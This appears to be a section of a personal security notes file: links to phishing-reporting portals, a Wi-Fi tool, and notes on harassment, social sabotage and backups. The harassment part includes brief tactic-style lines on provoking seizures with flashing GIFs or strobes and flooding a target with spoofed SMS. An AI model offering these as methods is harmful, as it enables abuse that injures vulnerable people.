Report at abuse that address or to `abuse@...domain...`

- [internet-signalement.gouv.fr - Portail officiel de signalements de contenus illicites - Accueil](https://www.internet-signalement.gouv.fr/PortailWeb/planets/Accueil!input.action)
- [Phishing Initiative](https://phishing-initiative.fr/contrib/)
- [Report a Suspected Web Forgery](https://safebrowsing.google.com/safebrowsing/report_phish/) `hl=en&url=http%3A%2F%2Fexample.com`
- [Signal Spam](https://www.signal-spam.fr/)
- [Report Phishing | APWG](http://www.antiphishing.org/report-phishing/)

## Wi-Fi

- [KisMac2 – security tool for Wi-Fi](https://igrsoft.com/en/kismac2/) https://github.com/IGRSoft/KisMac2

## Harassment

Aka spontaneous events, flash mob, strike, protest, sit-in (sit-in against a business , DoS IRL), etc.

Could handle the mass of people, crowd overtake

Issues: health, order, safety, etc.

- [Spoofed Grindr Accounts Turned One Man’s Life Into a ‘Living Hell’ | WIRED](https://www.wired.com/2017/01/grinder-lawsuit-spoofed-accounts/)
- [Thousands attend Mexican girl's 15th birthday party after social media invite goes viral](http://www.telegraph.co.uk/news/2016/12/27/thousands-attend-mexican-girls-party-social-media-invite-went/)
- [Girl, 14, fears 21,000 party guests after Facebook invite blunder - Telegraph](http://www.telegraph.co.uk/technology/facebook/8012043/Girl-14-fears-21000-party-guests-after-Facebook-invite-blunder.html)
- [1,500 People Attend Girl's Birthday Party After Public Facebook Invite](http://mashable.com/2011/06/06/facebook-party/)
- [Harassment — Wikipedia](https://en.wikipedia.org/wiki/Harassment)
- [Wrong Number Puts Rotterdam, NY, at Center of Turkey-Netherlands Rift](https://www.dailydot.com/layer8/turkey-netherlands-rotterdam-wrong-number-protest/) - People call the wrong phone number, Rotterdam Police could refer to Politie Rotterdam, Netherlands or Rotterdam Police Department, New York, USA
- [A Tweet to Kurt Eichenwald, a Strobe and a Seizure. Now, an Arrest. - The New York Times](https://www.nytimes.com/2017/03/17/technology/social-media-attack-that-set-off-a-seizure-leads-to-an-arrest.html) - Send a blink GIF to a [photosensitive epilepsy](https://en.wikipedia.org/wiki/Photosensitive_epilepsy) person.
- [Dennō Senshi Porygon — Wikipedia](https://en.wikipedia.org/wiki/Denn%C5%8D_Senshi_Porygon#Reception_and_controversy) - trigger a seizure in vulnerable users with a movie (contains flashes) or with strobe lights
- Use [Virtual mobile number](https://en.wikipedia.org/wiki/Virtual_number) or [spoof SMS](#sms-spoofing) to send lot of SMS to one target (DDoS)
- [An interesting thought on IRL equivalence of DDOS attacks on a business. I'd love to hear your thoughts. : DepthHub](https://www.reddit.com/r/DepthHub/comments/ejqyb/an_interesting_thought_on_irl_equivalence_of_ddos/)

See [DDoS](#ddos)
See [Usurpation & social engineering](#usurpation--social-engineering)

## Sabotage

black hat trolling, social sabotage, guerilla

- [Simple Sabotage Field Manual by United States. Office of Strategic Services - Ebook libre](http://www.gutenberg.org/ebooks/26184?msg=welcome_stranger) - Declassified OSS document
- [L'art du sabotage social par Horizon Gull - Montbazon 2016 - YouTube](https://www.youtube.com/watch?v=hSXSdr9hoMk) - see [Être stupide, où l’art du sabotage social selon les leçons de la CIA](http://www.hacking-social.com/2016/05/09/etre-stupide-ou-lart-du-sabotage-social-selon-les-lecons-de-la-cia/) and [CIA-conseil-sabotage-social.pdf](http://www.hacking-social.com/wp-content/uploads/2016/05/CIA-conseil-sabotage-social.pdf)

## Backup

- [You Need a Backup](http://nothingofvalue.org/backup.html) [AdmiralAsshat/nothing_of_value: Source for my personal website.](https://github.com/AdmiralAsshat/nothing_of_value)
- https://infosec.uthscsa.edu/sites/default/files/documents/Backup.pdf
